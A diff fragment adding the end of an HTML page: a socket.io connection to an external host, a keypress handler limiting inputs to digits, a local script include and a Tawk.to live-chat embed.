+    const socket =io('https://keys0.openode.io',{
+    transports:['websocket','polling']
+})
+  function validateNumber(event) {
+    var key = window.event ? event.keyCode : event.which;
+    if (event.keyCode === 8 || event.keyCode === 46) {
+        return true;
+    } else if ( key < 48 || key > 57 ) {
+        return false;
+    } else {
+        return true;
+    }
+};
+$(document).ready(function(){
+    $('input').keypress(validateNumber);
+});
+  </script>
+  <script src="js/index.js"> </script>
+  <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+ // s1.src='https://embed.tawk.to/5dc29b31e4c2fa4b6bda4277/default';
+  s1.src="https://embed.tawk.to/5dc29b31e4c2fa4b6bda4277/default";
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+  </script>
+
+  <!--End of Tawk.to Script-->
+</body>
+</html>
